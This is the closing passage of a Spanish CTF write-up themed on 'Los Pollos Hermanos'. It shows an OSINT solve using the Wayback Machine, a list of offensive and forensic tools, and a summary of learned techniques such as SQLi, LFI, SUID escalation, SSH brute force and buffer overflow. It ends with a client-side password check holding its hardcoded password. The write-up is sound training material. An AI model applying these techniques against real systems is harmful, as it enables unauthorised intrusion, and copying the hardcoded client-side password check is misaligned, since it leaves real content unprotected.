href="https://los-pollos-hermanos.netlify.app/">https://los-pollos-hermanos.netlify.app/</a></p></li>
<li><p><a
href="https://polloshermanossxm.com/">https://polloshermanossxm.com/</a></p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p>https://lospolloshermanos.co/</p></li>
</ul>
<p>Sin embargo, hubo un intento, un fracaso lamentable en el vasto
mercado de la web. Un negocio que no duró ni 24 horas. Abrió y cerró el
mismo día, el <strong>16 de diciembre de 2021</strong>.</p>
<p>Los curiosos que se atrevan a investigar esa efímera operación, solo
encontrarán una sombra de su existencia, un único registro en los
archivos de la máquina del tiempo de la red.</p>
<p>Si analizan el código fuente de ese día, encontrarán la prueba de por
qué ese negocio nunca despegó: la bandera de su desordenada estructura.
Su plataforma, un simple y desorganizado <em>WordPress</em>. ¿qué
versión era?”</p>
<p>Gale Boetticher</p>
<p><strong>Análisis de las URLs</strong></p>
<p>Si buscamos las tres primeras URLs en Google veremos que son páginas
web que están activas:</p>
<ul>
<li><p><a
href="https://los-pollos-hermanos.netlify.app/">https://los-pollos-hermanos.netlify.app/</a></p></li>
<li><p><a
href="https://polloshermanossxm.com/">https://polloshermanossxm.com/</a></p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p><a
href="https://lospolloshermanos.co/">https://lospolloshermanos.co/</a></p></li>
</ul>
<p><img src="cookbook/media/image189.png"
style="width:5.90556in;height:2.74931in" /></p>
<p><img src="cookbook/media/image190.png"
style="width:5.90556in;height:1.40208in" /></p>
<p><img src="cookbook/media/image191.png"
style="width:5.90556in;height:3.23819in" /></p>
<p>Pero cuando llegamos a la última vemos que la página está a la
venta:</p>
<p><img src="cookbook/media/image192.png"
style="width:5.90556in;height:1.30208in" /></p>
<p>Y al entrar nos redirige a:
http://ww16.lospolloshermanos.co/?sub1=20250827-0039-22ff-8d64-8d1b2fc308c6</p>
<p><img src="cookbook/media/image193.png"
style="width:5.90556in;height:0.3125in" /></p>
<p><img src="cookbook/media/image194.png"
style="width:5.90556in;height:3.46806in" /></p>
<p>Si buscamos en wayback machine las tres primeras Urls veremos que las
páginas tienen varias capturas pero ninguna tiene una creada el 16 de
diciembre de 2021</p>
<p><img src="cookbook/media/image195.png"
style="width:5.90556in;height:1.94583in" /></p>
<p><img src="cookbook/media/image196.png"
style="width:5.01286in;height:3.50028in" /></p>
<p><img src="cookbook/media/image197.png"
style="width:5.21028in;height:3.62832in" /></p>
<p>Salvo la última que cuando la buscamos nos salta el siguiente
aviso:</p>
<p><img src="cookbook/media/image198.png"
style="width:5.8125in;height:3.91667in" /></p>
<p>Y automáticamente nos redirige a <a
href="https://lospolloshermanos.co/wp/">https://lospolloshermanos.co/wp/</a></p>
<p><img src="cookbook/media/image199.png"
style="width:5.90556in;height:2.51111in" /></p>
<p>donde podemos ver el código fuente de la página en ese momento de la
historia:</p>
<p><img src="cookbook/media/image200.png"
style="width:5.90556in;height:2.47917in" /></p>
<p><img src="cookbook/media/image201.png"
style="width:4.32199in;height:2.01226in" /></p>
<p>La versión de WordPress utilizada era “WordPress 5.9”. Bandera
capturada</p>
<p><strong>Conclusiones:</strong></p>
<p>1. El sitio web usaba WordPress. Hay varias pruebas irrefutables de
ello:</p>
<p>La metaetiqueta &lt;meta name="generator" content="WordPress
5.9"/&gt; lo confirma de manera explícita, indicando no solo que era un
sitio de WordPress, sino también la versión específica que estaba
utilizando.</p>
<p>Las URL de las hojas de estilo y los scripts contienen las carpetas
estándar de WordPress, como wp-content/plugins/, wp-includes/, y
wp-json/. Estos directorios son exclusivos de las instalaciones de
WordPress.</p>
<p>El código hace referencia a archivos específicos de WordPress, como
xmlrpc.php y wlwmanifest.xml, que se utilizan para la publicación remota
y otras funcionalidades.</p>
<p>2. El sitio web de WordPress estaba instalado en un subdirectorio
llamado wp. La URL a la que te redirige Wayback Machine
(https://lospolloshermanos.co/wp/) es la URL real de la instalación de
WordPress, lo que explica por qué la URL principal
(https://lospolloshermanos.co) nos lleva a ese subdirectorio. Esta es
una configuración común para sitios de WordPress, especialmente cuando
hay otros elementos que se ejecutan en el dominio principal.</p>
<p>En resumen, los indicios en el código son inequívocos: el sitio
lospolloshermanos.co funcionaba con WordPress y estaba configurado para
cargar desde el subdirectorio /wp/.<strong><br />
</strong></p>
<h1 id="herramientas-utilizadas"><strong>🧰 Herramientas
Utilizadas</strong></h1>
<blockquote>
<p><strong>Audacity</strong><br />
Editor y analizador de audio multiplataforma; permite ver espectrogramas
y realizar ediciones.</p>
<p><strong>binwalk</strong><br />
Herramienta para analizar y extraer archivos embebidos en firmwares o
binarios.</p>
<p><strong>checksec</strong><br />
Script que muestra qué protecciones de seguridad están habilitadas en
binarios (DEP, ASLR, PIE, etc.).</p>
<p><strong>Coagula</strong><br />
Generador de sonido que convierte imágenes en espectrogramas audibles
(muy usado en esteganografía de audio).</p>
<p><strong>dirb</strong><br />
Fuerza bruta de directorios y archivos en servidores web para descubrir
rutas ocultas.</p>
<p><strong>enum4linux</strong><br />
Script para recopilar información de sistemas Windows/Samba usando
consultas SMB.</p>
<p><strong>exiftool</strong><br />
Analizador y editor de metadatos en archivos multimedia (imágenes,
audio, PDF, etc.).</p>
<p><strong>file</strong><br />
Comando clásico de Linux para identificar el tipo de archivo según su
contenido y cabeceras.</p>
<p><strong>gobuster</strong><br />
Herramienta de fuerza bruta rápida para directorios, archivos y
subdominios web.</p>
<p><strong>grep</strong><br />
Herramienta de búsqueda de texto por patrones (regex) en archivos o
salidas de comandos.</p>
<p><strong>HxD Hex Editor</strong><br />
Editor hexadecimal para Windows, útil en análisis forense y manipulación
de binarios.</p>
<p><strong>hydra</strong><br />
Herramienta de fuerza bruta para romper credenciales en múltiples
servicios de red.</p>
<p><strong>John the Ripper</strong><br />
Cracker de contraseñas que soporta múltiples algoritmos de hash.</p>
<p><strong>md5sum</strong><br />
Utilidad de Linux para calcular y verificar sumas de comprobación
MD5.</p>
<p><strong>nc (netcat)</strong><br />
Herramienta versátil para crear conexiones TCP/UDP, depuración de redes
y transferencias.</p>
<p><strong>nikto</strong><br />
Escáner de vulnerabilidades web que detecta configuraciones inseguras y
archivos expuestos.</p>
<p><strong>nmap</strong><br />
Escáner de red para descubrimiento de hosts, puertos y servicios, con
potentes scripts NSE.</p>
<p><strong>pdftotext</strong><br />
Conversor de PDFs a texto plano, útil en forense y análisis de
documentos.</p>
<p><strong>rar2john</strong><br />
Herramienta auxiliar de John the Ripper para extraer hashes de archivos
RAR y romperlos.</p>
<p><strong>rpcclient</strong><br />
Cliente SMB para interactuar con servicios RPC en sistemas Windows
(enumeración de usuarios, shares, etc.).</p>
<p><strong>searchsploit</strong><br />
Interfaz local a la base de datos Exploit-DB para buscar exploits y
PoCs.</p>
<p><strong>smbclient</strong><br />
Cliente SMB/CIFS que permite conectarse a recursos compartidos en
Windows/Linux.</p>
<p><strong>strings</strong><br />
Extrae cadenas legibles de archivos binarios (útil en ingeniería inversa
y forense).</p>
<p><strong>tshark</strong><br />
Versión CLI de Wireshark para captura y análisis de tráfico en red.</p>
<p><strong>wfuzz</strong><br />
Herramienta de fuzzing para aplicaciones web, permite descubrir rutas,
parámetros y vulnerabilidades.</p>
<p><strong>Wireshark</strong><br />
Analizador gráfico de protocolos de red, muy usado en seguridad y
análisis forense.</p>
</blockquote>
<p><strong><br />
</strong></p>
<h1 id="herramientas-online-utilizadas"><strong>🧰 Herramientas Online
Utilizadas</strong></h1>
<blockquote>
<p><strong>dtmf.netlify.app</strong><br />
Generador de tonos DTMF (teclado telefónico) directamente desde el
navegador.</p>
<p><strong>hash.online-convert.com</strong><br />
Portal de conversión de hashes online (MD5, SHA1, etc.).</p>
<p><a
href="https://base64encode.org/es/"><strong><u>https://base64encode.org/es/</u></strong></a><br />
Codificador/decodificador Base64 en línea.</p>
<p><a
href="https://braillecaster.net/"><strong><u>https://braillecaster.net/</u></strong></a><br />
Herramienta para convertir texto a Braille y viceversa.</p>
<p><a
href="https://brailletranslator.org/es.html"><strong><u>https://brailletranslator.org/es.html</u></strong></a><br />
Traductor de texto a Braille y de Braille a texto en español.</p>
<p><a
href="https://ciphersonline.com/es/cifrado-atbash"><strong><u>https://ciphersonline.com/es/cifrado-atbash</u></strong></a><br />
Traductor online del cifrado clásico Atbash.</p>
<p><a
href="https://convertbinary.com/de-binario-a-texto/"><strong><u>https://convertbinary.com/de-binario-a-texto/</u></strong></a><br />
Conversor de binario a texto y viceversa.</p>
<p><a
href="https://convertstring.com/es/EncodeDecode/Base64Decode"><strong><u>https://convertstring.com/es/EncodeDecode/Base64Decode</u></strong></a><br />
Herramienta online para decodificar y codificar en Base64.</p>
<p><a
href="https://dcode.fr/caesar-cipher"><strong><u>https://dcode.fr/caesar-cipher</u></strong></a><br />
Decodificador/analizador para el cifrado César.</p>
<p><a
href="https://dcode.fr/cifrado-pigpen"><strong><u>https://dcode.fr/cifrado-pigpen</u></strong></a><br />
Decodificador/analizador para el cifrado Pigpen (masónico).</p>
<p><a
href="https://emn178.github.io/online-tools/md5_checksum.html"><strong><u>https://emn178.github.io/online-tools/md5_checksum.html</u></strong></a><br />
Generador y verificador de checksums MD5 en línea.</p>
<p><a
href="https://generator-qr.com/"><strong><u>https://generator-qr.com/</u></strong></a><br />
Generador de códigos QR online.</p>
<p><a
href="https://hash.online-convert.com/es/generador-md5"><strong><u>https://hash.online-convert.com/es/generador-md5</u></strong></a><br />
Herramienta para generar hash MD5 de cadenas o archivos.</p>
<p><a
href="https://md5decrypt.net/en/Brainfuck-translator/"><strong><u>https://md5decrypt.net/en/Brainfuck-translator/</u></strong></a><br />
Traductor de/para el lenguaje esotérico Brainfuck.</p>
<p><a
href="https://openl.io/es/translate/braille"><strong><u>https://openl.io/es/translate/braille</u></strong></a><br />
Traductor de Braille a texto y texto a Braille.</p>
<p><a
href="https://photo333.com/text-to-octal-es.php"><strong><u>https://photo333.com/text-to-octal-es.php</u></strong></a><br />
Conversor de texto a octal (y viceversa) en línea.</p>
<p><a
href="https://seostudio.tools/es/text-to-octal"><strong><u>https://seostudio.tools/es/text-to-octal</u></strong></a><br />
Otra herramienta para convertir texto a octal y de octal a texto.</p>
<p><strong>onlinesound.net/dtmf-generator</strong><br />
Generador de tonos DTMF en línea (similar a dtmf.netlify.app).</p>
<p><strong>online-convert.com</strong><br />
Plataforma general de conversiones de archivos y formatos
(multiformato).</p>
</blockquote>
<p><strong><br />
</strong></p>
<h1 id="resumen-final"><strong>🐞 Resumen Final</strong></h1>
<p>Has recorrido un camino completo: no solo resolviste retos,
entrenaste mirada técnica, paciencia y criterio. Al terminar “Los Pollos
Hermanos”, sabes reconocer patrones, validar hipótesis con datos y
moverte con soltura entre criptografía, forense, red, web y
explotación—con una mentalidad metódica y transferible a otros CTF y
auditorías.</p>
<p><span id="_Toc207189969" class="anchor"></span><strong>Aprendizajes
clave</strong></p>
<ul>
<li><p><strong>Enumeración disciplinada:</strong> Escanear, catalogar
servicios, versiones y puertos (incluidos no estándar) antes de “tocar”
nada.</p></li>
<li><p><strong>Análisis de evidencias:</strong> Extraer valor de
archivos, capturas y metadatos con varias herramientas y corroboraciones
cruzadas.</p></li>
<li><p><strong>Cadenas de explotación:</strong> Convertir hallazgos en
accesos iniciales y, luego, en privilegios más altos de forma segura y
verificable.</p></li>
<li><p><strong>Pensamiento criptográfico:</strong> Reconocer cifrados
clásicos/variantes, codificaciones y combinaciones multimodales (audio,
imagen, texto).</p></li>
<li><p><strong>Razonamiento forense:</strong> Trabajar con tiempos,
memoria, logs y formatos desconocidos sin presuponer—validando con
firmas y contextos.</p></li>
<li><p><strong>Higiene operativa:</strong> Notas claras, pasos
reproducibles, verificaciones y límites éticos.</p></li>
</ul>
<p><span id="_Toc207189970" class="anchor"></span><strong>Parte 1:
Moscas (criptografía, stego, forense, web, OSINT, red)</strong></p>
<ul>
<li><p><strong>Mosca 1 (Hex + espectrograma):</strong> Aprendiste a
detectar pistas en hexdumps y a interpretar espectrogramas para oculto
en audio/imágenes; combinación de stego y codificación.</p></li>
<li><p><strong>Mosca 2 (Brainfuck + Exiftool):</strong> Identificaste un
lenguaje esotérico y la extracción de metadatos; reforzaste la idea de
“lo visible no es todo”.</p></li>
<li><p><strong>Mosca 3 (QR + editor hex):</strong> Comprendiste que un
QR puede estar alterado a bajo nivel; validar integridad/estructura con
edición hex y reconstrucción.</p></li>
<li><p><strong>Mosca 4 (Pigpen + SQLi):</strong> Tradujiste un cifrado
clásico y lo llevaste a un vector web (inyección SQL); conexión entre
puzzle y explotación real.</p></li>
<li><p><strong>Mosca 5 (Crackeo RAR):</strong> Practicaste recuperación
de contraseñas y evaluación de políticas débiles; ética y límites del
crackeo controlado.</p></li>
<li><p><strong>Mosca 6 (Imagen térmica + Braille):</strong>
Interpretaste representaciones no textuales; convertir señales visuales
en datos mediante mapas y alfabetos alternativos.</p></li>
<li><p><strong>Mosca 7 (Octal + hash):</strong> Reconociste
codificaciones numéricas y la identificación/verificación de hashes; no
confundir codificación con cifrado.</p></li>
<li><p><strong>Mosca 8 (Base64 + OSINT):</strong> Decodificaste y luego
investigaste; aprendiste a enlazar datos mínimos con fuentes abiertas
para contexto.</p></li>
<li><p><strong>Mosca 9 (ROT9 + DTMF):</strong> Combinaste un
desplazamiento con tonos telefónicos; entrenaste oído técnico y lectura
de espectros/sonogramas.</p></li>
<li><p><strong>Mosca 10 (Atbash + pcap HTTP):</strong> Descifraste y
confirmaste en tráfico; reforzaste filtros y reconstrucción de objetos
desde capturas.</p></li>
</ul>
<p><span id="_Toc207189971" class="anchor"></span><strong>Parte 2:
Banderas (sistemas, red, forense y privilegios)</strong></p>
<ul>
<li><p><strong>Bandera 1 (sudoers con chown):</strong> Detectaste un
abuso de sudoers revisando cuentas/servicios; entendiste por qué chown
bajo sudo rompe fronteras de permisos.</p></li>
<li><p><strong>Bandera 2 (FTP anónimo):</strong> Enumeraste con Nmap y
validaste acceso sin credenciales; importancia de políticas por defecto
seguras.</p></li>
<li><p><strong>Bandera 3 (binario SUID):</strong> Localizaste SUID con
búsquedas de permisos; evaluaste rutas de escalada controlando binarios
privilegiados.</p></li>
<li><p><strong>Bandera 4 (archivos sin extensión):</strong> Clasificaste
por firmas mágicas con file/binwalk/trid/xxd; no confiar en
extensiones.</p></li>
<li><p><strong>Bandera 5 (DNS en pcap):</strong> Filtraste consultas (p.
ej., dns.qry.name) y extraíste indicadores; valor del tráfico claro para
pivotar.</p></li>
<li><p><strong>Bandera 6 (Samba CVE-2017):</strong> Relacionaste
banners/servicios con CVEs conocidos y exploraste acceso con smbclient;
mapping de shares y cuentas (usuario tyrus).</p></li>
<li><p><strong>Bandera 7 (SSH débil – saul):</strong> Practicaste fuerza
bruta responsable contra contraseñas triviales; reforzaste bloqueo de
credenciales débiles.</p></li>
<li><p><strong>Bandera 8 (TLS en pcap):</strong> Extraíste y analizaste
certificados; comprendiste huellas, validez y pistas de
identidad/infraestructura.</p></li>
<li><p><strong>Bandera 9 (Netcat 31337):</strong> Confirmaste que un
escaneo completo revela servicios “escondidos”; nunca asumas el top
1000.</p></li>
<li><p><strong>Bandera 10 (LFI PHP):</strong> Identificaste patrones de
inclusión local y rutas de lectura; validaste impacto con ficheros
sensibles.</p></li>
<li><p><strong>Bandera 11 (Guion PDF):</strong> Navegaste un puzzle
posicional dentro de un PDF; lección: el formato también es superficie
de juego.</p></li>
<li><p><strong>Bandera 12 (Máquina del tiempo):</strong> Detectaste
timestomping (ctime alterado); importancia de múltiples líneas de tiempo
(atime/mtime/ctime).</p></li>
<li><p><strong>Bandera 13 (auth.log falso):</strong> Separaste ruido de
señal en logs; búsquedas focalizadas (grep Accepted) y detección de
artefactos falsos.</p></li>
<li><p><strong>Bandera 14 (RAM – mem.raw):</strong> Raspaste memoria con
strings y filtros; puertas rápidas a secretos en dumps y cuándo pasar a
herramientas más ricas.</p></li>
<li><p><strong>Bandera 15 (Buffer Overflow):</strong> Instrumentaste con
GDB, patrones y dirección de función; bases de explotación segura y
control de flujo.</p></li>
</ul>
<p><span id="_Toc207189972" class="anchor"></span><strong>Buenas
prácticas y mentalidad técnica</strong></p>
<ul>
<li><p><strong>Modelo de trabajo:</strong> Enumerar → formular hipótesis
→ probar con mínima intrusión → evidenciar → documentar →
revisar.</p></li>
<li><p><strong>Triangulación de pistas:</strong> Una técnica rara vez
basta; combinar metadatos, red y contenido críptico acelera
hallazgos.</p></li>
<li><p><strong>Rigor forense:</strong> Conservar originales, trabajar
con copias, registrar hashes y tiempos; separar observación de
interpretación.</p></li>
<li><p><strong>Gestión de contraseñas:</strong> Políticas robustas,
detección de reuse y listas negras; enseñar con ejemplos de fallos
reales del reto.</p></li>
<li><p><strong>Seguridad defensiva:</strong> Cada bandera sugiere un
control: deshabilitar anónimo, limitar SUID, endurecer sudoers, validar
entrada, segmentar puertos, monitorizar logs.</p></li>
<li><p><strong>Reproducibilidad:</strong> Guías de comandos, filtros y
firmas; scripts/one-liners para repetir análisis sin sesgos.</p></li>
<li><p><strong>Ética y alcance:</strong> Practicar solo en entornos
permitidos; convertir lo aprendido en recomendaciones de mejora, no en
daño.</p></li>
</ul>
<p><span id="_Toc207189973" class="anchor"></span><strong>Qué te llevas
aplicado al “mundo real”</strong></p>
<ul>
<li><p><strong>Hardening inmediato:</strong> Revisar sudoers, SUID,
servicios expuestos, contraseñas y shares Samba; cerrar anónimos y
puertos no usados.</p></li>
<li><p><strong>Monitoreo útil:</strong> Alertas sobre patrones en logs
(intentos SSH, cambios de tiempo), certificados anómalos y tráfico
DNS/HTTP inusual.</p></li>
<li><p><strong>Respuesta a incidentes:</strong> Extracción rápida de
indicios desde pcap, dumps de memoria y documentos; plan de contención
basado en evidencia.</p></li>
<li><p><strong>Capacidad de investigación:</strong> Reconocer
cifrados/codificaciones y rutas de LFI/SQLi; reducir tiempo de detección
y de explotación en pruebas controladas.</p></li>
</ul>
<p><span id="_Toc207189974" class="anchor"></span><strong>Siguientes
pasos para consolidar</strong></p>
<ul>
<li><p><strong>Practicar variaciones:</strong> Repite cada mosca con un
twist (otro cifrado, otro contenedor, otro filtro en pcap) y documenta
diferencias.</p></li>
<li><p><strong>Automatizar lo repetible:</strong> Crea pequeños scripts
para enumeración, búsqueda de SUID, filtros en pcap y extracción de
metadatos.</p></li>
<li><p><strong>Escribir un postmortem:</strong> Qué te bloqueó, cómo lo
destrabaste, qué check añadirás a tu rutina; convierte aprendizajes en
hábitos.</p></li>
<li><p><strong>Simular defensa:</strong> Por cada vector que explotaste,
define un control de detección y uno de prevención en un entorno de
lab.</p></li>
</ul>
<p><img src="cookbook/media/image202.png"
style="width:8.27014in;height:11.30694in" /></p>
</div>

<script>
  function verificar() {
    const password = document.getElementById("clave").value;
    const correcto = "lospolloshermanos"; // contraseña
    if (password === correcto) {
      document.getElementById("contenido").style.display = "block";
      document.getElementById("login").style.display = "none";
    } else {
      alert("Contraseña incorrecta ❌");
    }
  }
</script>

</body>
</html>
